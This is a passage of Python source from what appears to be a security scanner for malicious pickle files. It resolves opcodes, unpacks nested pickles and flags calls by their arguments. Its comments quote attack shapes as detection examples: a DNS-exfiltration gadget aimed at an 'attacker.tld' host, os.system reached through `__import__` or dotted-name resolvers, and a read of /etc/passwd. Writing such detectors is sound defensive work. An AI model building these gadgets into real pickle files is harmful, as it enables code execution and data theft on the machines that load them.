            # `__import__('os').system` reconstruct as `os.system`. Handled
            # inside the recursion so it composes with attribute access at
            # any depth rather than being a top-level special case.
            func = dotted(node.func)
            if func in ("__import__", "importlib.import_module") and node.args:
                first = node.args[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str):
                    return first.value
            return func
        return None

    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = dotted(node.func)
            if name:
                yield name
        elif isinstance(node, ast.Import):
            for alias in node.names:
                yield alias.name
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                for alias in node.names:
                    yield f"{node.module}.{alias.name}"


def _pickle_source_denied_target(text: str) -> str | None:
    """Return the first denied callable `text` would resolve as Python, if any."""
    for name in _iter_pickle_source_targets(text):
        if _classify_pickle_global(name) == "denied" or _is_denied_pickle_module(name):
            return name
    return None


def _iter_pickle_arg_values(value: Any, _seen: set[int] | None = None):
    """Yield every scalar nested anywhere inside a resolved argument value.

    Recurses over container depth an attacker controls (nested TUPLE1 opcodes),
    and unlike the opcode walk this runs outside `_scan_pickle`'s try/except,
    so a RecursionError here would escape rather than degrade. It cannot reach
    one: `_is_pickle_literal` walks the identical structure first, from deeper
    in the stack inside `_resolve_pickle_globals`, so any nesting deep enough
    to overflow is rejected before a call is ever recorded (verified
    exhaustively over nesting depths 1..699 -- the limit trips at ~500 and
    always inside the guarded walk). Keep that ordering if either is moved.

    Shared containers are visited once, for the same reason `_is_pickle_literal`
    memoizes: `DUP` makes the simulated stack a DAG, and re-walking shared
    subtrees turns a 73-byte file into exponential work. A value that appears
    twice adds no evidence the first occurrence did not already provide.
    """
    if _seen is None:
        _seen = set()
    if isinstance(value, (tuple, list, set, frozenset, dict)):
        marker = id(value)
        if marker in _seen:
            return
        _seen.add(marker)
    if isinstance(value, (tuple, list, set, frozenset)):
        for item in value:
            yield from _iter_pickle_arg_values(item, _seen)
    elif isinstance(value, dict):
        for key, item in value.items():
            yield from _iter_pickle_arg_values(key, _seen)
            yield from _iter_pickle_arg_values(item, _seen)
    else:
        yield value


def _pickle_arg_text(value: Any) -> str | None:
    """Return `value` as text if it is a string, or bytes that are entirely
    printable ASCII; otherwise None.

    A `_PickleGlobalRef` is excluded first: it is a resolved class reference
    (an object), not free text, whatever its string rendering suggests. The
    printability gate matters: binary argument blobs are routine in real
    pickles (`datetime.datetime(b'\\x07\\xe4\\x01\\x01...')` is the canonical
    one) and raw bytes contain `|`, `;` and `&` constantly. Running the
    command-shape patterns over decoded binary would turn every pickled
    datetime into a HIGH finding.
    """
    if isinstance(value, _PickleGlobalRef):
        return None
    if isinstance(value, str):
        return value
    if isinstance(value, (bytes, bytearray)):
        try:
            text = value.decode("ascii")
        except UnicodeDecodeError:
            return None
        return text if text.isprintable() else None
    return None


def _iter_pickle_host_port_pairs(value: Any, _seen: set[int] | None = None):
    """Yield every ``(hostname, port)``-shaped 2-tuple nested in `value`.

    Structural rather than name-based: a dotted hostname paired with an
    integer in port range is the socket-address literal, which is how the
    DNS-exfiltration gadgets are parameterized
    (``ssl.get_server_certificate(("<exfil>.attacker.tld", 443))``).
    """
    if _seen is None:
        _seen = set()
    if isinstance(value, (tuple, list, dict)):
        marker = id(value)
        if marker in _seen:
            return
        _seen.add(marker)
    if isinstance(value, dict):
        for item in value.values():
            yield from _iter_pickle_host_port_pairs(item, _seen)
    elif isinstance(value, (tuple, list)):
        if (
            len(value) == 2
            and isinstance(value[0], str)
            and isinstance(value[1], int)
            and not isinstance(value[1], bool)
            and 0 < value[1] <= 65535
            and _PICKLE_ARG_HOSTNAME_RE.match(value[0])
        ):
            yield value[0], value[1]
        for item in value:
            yield from _iter_pickle_host_port_pairs(item, _seen)


# A pickle stream begins with a PROTO opcode (protocols 2 and up) or one of
# the handful of opcodes a protocol-0 or -1 stream can open with. FRAME
# (\x95) is deliberately absent: it only ever follows a PROTO opcode, so it
# is never a stream opener and merely widened the sniff aperture.
_NESTED_PICKLE_OPENERS = (b"\x80", b"(", b"]", b"}", b"c", b"\x8c")


# A bytes-literal pickle can itself carry a bytes-literal pickle, and so on.
# Real files never nest deeply, so the recursion is capped: at each level a
# pickle is fully resolved, so an unbounded depth would let a hand-built file
# of pickles-in-pickles cost O(depth) full walks for nothing.
_EMBEDDED_PICKLE_MAX_DEPTH = 2


def _nested_pickle_globals(blob: bytes) -> list[str] | None:
    """Globals referenced by a pickle stream carried inside a bytes literal.

    Resolution is delegated to the same walker the outer stream uses, so
    STACK_GLOBAL and the memo behave identically one level down. A hand-rolled
    opcode scan here saw only ``<stack_global>`` and missed every protocol-4
    payload, which is most of them.
    """
    if not isinstance(blob, (bytes, bytearray)) or len(blob) < 4:
        return None
    if bytes(blob[:1]) not in _NESTED_PICKLE_OPENERS:
        return None
    try:
        names, _calls, _memo = _resolve_pickle_globals(bytes(blob))
    except Exception:                                    # noqa: BLE001
        return None
    return sorted(names) or None


def _nested_pickle_evidence(blob: bytes) -> list[str]:
    """Evidence from one pickle stream carried inside a bytes literal.

    Returns descriptor strings for the MFV-PICKLE-008 finding: each is either a
    denied ``module.name`` the inner stream references, or a convicted-call
    descriptor ``"os.system('id') [reason]"`` for an inner call whose callable
    is unknown but whose *arguments* convict it under ARGUMENT triage.

    Resolution is delegated to the same walker the outer stream uses, so
    STACK_GLOBAL and the memo behave identically one level down. A hand-rolled
    opcode scan here saw only ``<stack_global>`` and missed every protocol-4
    payload, which is most of them.
    """
    if not isinstance(blob, (bytes, bytearray)) or len(blob) < 4:
        return []
    if bytes(blob[:1]) not in _NESTED_PICKLE_OPENERS:
        return []
    try:
        names, calls, _memo = _resolve_pickle_globals(bytes(blob))
    except Exception:                                    # noqa: BLE001
        return []
    evidence: list[str] = []
    for name in names:
        if _classify_pickle_global(name) == "denied":
            evidence.append(name)
    # Unknown-tier callables whose arguments convict them. A denied global never
    # appears in these streams, so name-matching alone drops them; re-run the
    # same ARGUMENT triage the outer walk uses one level down. Denied refs are
    # skipped here because the loop above already captured them by name.
    for call in calls:
        if _classify_pickle_global(call.ref) == "denied":
            continue
        verdict = _triage_unknown_pickle_call(call)
        if verdict is not None:
            _severity, reason = verdict
            evidence.append(f"{call.format()} [{reason}]")
    return evidence


def _embedded_pickle_denied_globals(data: bytes, depth: int = 0) -> list[str]:
    """Denied callables hiding in a pickle stream carried as a bytes literal.

    `numpy.load(BytesIO(<pickle>))` is the published shape. numpy.load is on
    nobody's deny list, the outer stream contains no URL or shell string, and
    the payload only exists once the inner bytes are themselves unpickled.
    Any loader handed those bytes will read them, so this scanner reads them
    too, one level down.

    Reports two kinds of evidence per inner stream: an already-denied callable
    it references, and an inner call convicted by ARGUMENT triage (an unknown
    callable handed a URL, a shell string, or a denied name as data). A nested
    pickle carrying neither is unusual rather than dangerous, and reporting
    merely unusual structure is how a scanner starts flagging real models.

    `depth` bounds recursion into bytes-literal pickles nested inside other
    bytes-literal pickles (see `_EMBEDDED_PICKLE_MAX_DEPTH`).
    """
    found: list[str] = []
    # Iterate lazily: materialising the opcode list first costs one tuple per
    # opcode of file -- 500MB of 1-byte opcodes is tens of GB -- and this runs
    # on every pickle file before the main walk. Semantics are unchanged: an
    # unparseable stream still yields nothing, because the exception aborts
    # the same loop the old list() fed.
    try:
        for op, arg, _pos in pickletools.genops(io.BytesIO(data)):
            # BYTEARRAY8 carries a pickle just as the BINBYTES family does;
            # genops yields it as a bytearray, so normalise to bytes below.
            if op.name not in (
                "SHORT_BINBYTES", "BINBYTES", "BINBYTES8", "BYTEARRAY8",
            ):
                continue
            inner = bytes(arg) if isinstance(arg, (bytes, bytearray)) else b""
            found.extend(_nested_pickle_evidence(inner))
            # A bytes-literal pickle can itself hide another one. Recurse into
            # it, bounded, so a payload buried two levels down is still read.
            if depth < _EMBEDDED_PICKLE_MAX_DEPTH:
                found.extend(_embedded_pickle_denied_globals(inner, depth + 1))
    except Exception:                                    # noqa: BLE001
        return []
    return sorted(set(found))


def _triage_unknown_pickle_call(
    call: PickleResolvedCall | None,
) -> tuple[Severity, str] | None:
    """Re-triage one unknown global against the argument-level evidence the
    opcode walk resolved for it, returning ``(severity, reason)`` or None to
    leave it in the INFO bucket.

    Takes only the resolved call, not the global's name: after measuring the
    module-identity tier against real pickles (see the note above), every
    surviving signal reads the arguments and nothing reads the callable's
    name. That is the intended shape -- a verdict derived from the name is a
    deny list, and a deny list is what the bypass gadgets are designed to
    walk past.

    Ordered strongest evidence first; the first match wins.
    """
    if call is None:
        # Referenced but never invoked, or invoked with arguments that could
        # not be resolved to literals. No evidence to act on -- the scanner
        # does not guess at values it cannot verify.
        return None

    # A code object carries its source path in co_filename, so the path signal
    # says nothing about this call. Every other signal still applies.
    is_code_builder = call.ref in _PICKLE_CODE_OBJECT_BUILDERS
    takes_pattern = call.ref in _PICKLE_PATTERN_ARG_CALLABLES

    if call.partial_texts:
        # Only some arguments resolved. The text signals below still apply --
        # a literal is a literal wherever it sat in the argument list -- but
        # the (host, port) check below is skipped, because it reasons about
        # tuple *structure* that this call, by definition, does not have.
        texts = list(call.partial_texts)
        arguments: Any = ()
    else:
        arguments = (call.args, call.kwargs or {})
        texts = [
            text
            for text in (_pickle_arg_text(v) for v in _iter_pickle_arg_values(arguments))
            if text is not None
        ]

    for text in texts:
        if takes_pattern:
            # The argument is a regular expression by the callable's contract.
            continue
        if _PICKLE_ARG_URL_RE.search(text):
            return (Severity.HIGH, "invoked with a URL argument")
        if _PICKLE_ARG_SHELL_RE.search(text) or (text.startswith("/") and " " in text.strip()):
            return (Severity.HIGH, "invoked with a shell-command-shaped argument")

    if next(_iter_pickle_host_port_pairs(arguments), None) is not None:
        return (Severity.HIGH, "invoked with a network endpoint (host, port) argument")


    for text in texts:
        # A literal string that *names* something denied, handed to some other
        # callable. This is dynamic resolution in its general form, and the
        # check needs no list of its own: it re-runs the existing
        # classification over the argument instead of over a resolved global.
        #
        # It is the answer to automatically-discovered gadgets. PickleCloak
        # mines the stdlib for dotted-name resolvers and finds ones nobody has
        # listed -- `logging.config._resolve`, `unittest.mock._dot_lookup`,
        # `xmlrpc.server.resolve_dotted_attribute`,
        # `sympy.utilities.source.get_class` -- but every one of them is handed
        # the same `'os.system'`, because the *resolver* is interchangeable and
        # the *target* is not. Keying on the target rather than the resolver is
        # what stops this being a list-maintenance race.
        if _classify_pickle_global(text) == "denied" or _is_denied_pickle_module(text):
            return (
                Severity.HIGH,
                f"is invoked with {text!r}, which names a callable this scanner denies -- "
                f"the shape of a dynamic-resolution gadget, where an innocuous-looking "
                f"resolver is handed the dangerous target as data",
            )
        # The same test, read through Python's grammar rather than off the
        # bare string: an argument that is *source code* naming a denied
        # callable. Same classifier, same reasoning, wider aperture -- see
        # `_iter_pickle_source_targets`.
        source_target = _pickle_source_denied_target(text)
        if source_target is not None:
            return (
                Severity.HIGH,
                f"is invoked with {_PICKLE_ARG_REPR.repr(text)}, which is Python source "
                f"resolving {source_target!r}, a callable this scanner denies -- the shape "
                f"of an eval-family gadget, where the evaluator is interchangeable and only "
                f"the target it is handed matters",
            )
        if text in _PICKLE_DENIED_ATTR_NAMES and not is_code_builder:
            return (
                Severity.MEDIUM,
                f"invoked with {text!r}, the attribute name of a known code-execution "
                f"callable -- the shape of a getattr/attrgetter chain resolving it dynamically",
            )

    # The three-link gadget chain, keyed purely on the shape of the call graph
    # and on no name anywhere in it:
    #
    #   1. some call produces an object,
    #   2. this call consumes that object together with a literal identifier,
    #   3. and this call's own result is then *invoked*.
    #
    # That is dynamic member resolution followed by a call: build an object,
    # name a member on it with a string, invoke what comes back. The dangerous
    # attribute never appears in the opcode stream, so the global walk has
    # nothing to resolve and no list can help.
    #
    # All three links are required, and link 3 is what makes it safe. Links 1
    # and 2 alone are not rare enough: a legitimate `__reduce__` returning
    # `(Outer, (inner_obj, 'field_name'))` has exactly that shape and is a
    # plausible thing for a real library to do -- it was a measured false
    # positive on a hand-built benign pickle before link 3 was added. What has
    # no benign counterpart is the third link. Pickle's own protocol always
    # names the callable operand of a REDUCE via GLOBAL/STACK_GLOBAL; a stream
    # that instead calls a value it computed at load time is doing something
    # the serialization format never needs to do.
    #
    # Neither end of the chain can be listed: PickleCloak's resolvers
    # (`unittest.mock._dot_lookup`, `xmlrpc.server.resolve_dotted_attribute`,
    # `lib2to3.fixer_util.attr_chain`) are mined automatically, and the targets
    # (`save`, `read_file`, `to_string`, `_loads`) are ordinary method names
    # that are dangerous only on the specific class just constructed. The edge
    # between them is the only stable thing to key on.
    #
    # MEDIUM, matching the getattr/attrgetter tier above: this establishes that
    # a member is being resolved dynamically and then called, not what it
    # resolves to.
    # Code-object builders are exempt, and they are the counterexample this
    # comment worried about. `dill._create_function(_create_code(...),
    # globals, '__name__', ...)` has all three links by construction: it
    # consumes a code object, is handed the function's own name as a literal,
    # and the function it returns is then called. Measured on SafePickle's
    # benign half, that shape alone promoted 80 of 644 real models.
    if call.chained_from and call.result_invoked and not is_code_builder:
        identifiers = [t for t in texts if t.isidentifier()]
        if identifiers:
            return (
                Severity.MEDIUM,
                f"consumes the result of {call.chained_from[0]}(), is handed "
                f"{identifiers[0]!r} as a literal, and its own result is then invoked -- the "
                f"shape of a dynamic member lookup on a freshly constructed object, which "
                f"keeps the resolved attribute out of the opcode stream entirely",
            )

    for text in texts:
        if _PICKLE_ARG_PATH_RE.search(text) and not is_code_builder:
            # Weak on its own -- `pathlib.PurePosixPath('/home/u/model.bin')`
            # looks identical to `linecache.getline('/etc/passwd', 1)` at the
            # opcode level, and a file read is not code execution either way.
            # LOW is enough to clear the INFO tier that gets suppressed
            # wholesale without overstating what the evidence shows.
            #
            # Deliberately still anchored at the start of the string. Relaxing
            # it to "any whitespace-separated token is a path" was tried, to
            # reach `getoutput('touch /tmp/liut')` where the path sits second;
            # it promoted three more corpus files and false-positived on
            # ordinary prose that mentions a path ("weights were loaded from
            # /opt/models/base.bin"). The anchor is doing real work: a string
            # that *begins* with a path is a path, while a string that merely
            # contains one is usually a sentence. Separating the two needs a
            # judgement about whether token 0 is a command name, which is a
            # list of command names by another route.
            return (Severity.LOW, "invoked with an absolute or traversing filesystem path argument")

    return None
